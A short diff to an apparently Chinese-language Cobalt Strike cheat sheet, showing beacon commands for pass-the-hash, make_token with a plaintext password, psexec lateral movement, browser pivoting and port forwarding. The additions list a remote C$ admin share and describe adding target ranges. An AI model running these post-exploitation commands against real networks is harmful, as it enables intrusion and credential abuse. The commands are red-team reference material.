@@ -23,6 +23,7 @@ beacon> pth WANFANG2008\xxzx 1c4a7b9bcbbaeeec8ce8d7588e7a5154
 beacon> jump psexec WANFANG2008 smb
 
 beacon> make_token WANFANG2008\xxzx XKsi_920902Su@
+beacon> ls \\192.168.61.129\C$
 beacon> jump psexec IISSERVER smb
 ### 启动 http 代理
 beacon> browserpivot <pid> # pid必须为iexplore.exe 下的pid
@@ -644,6 +645,11 @@ beacon >
 
 `rportfwd` does require that the SSH daemon's `GatewayPorts` option is set to `yes` or `ClientSpecified`.
 
+### targets
+
+View - targets, 可手动或导入
+
+手动 192.168.1.0/24
 ## Plugins
 
 ### CrossC2/上线 Linux
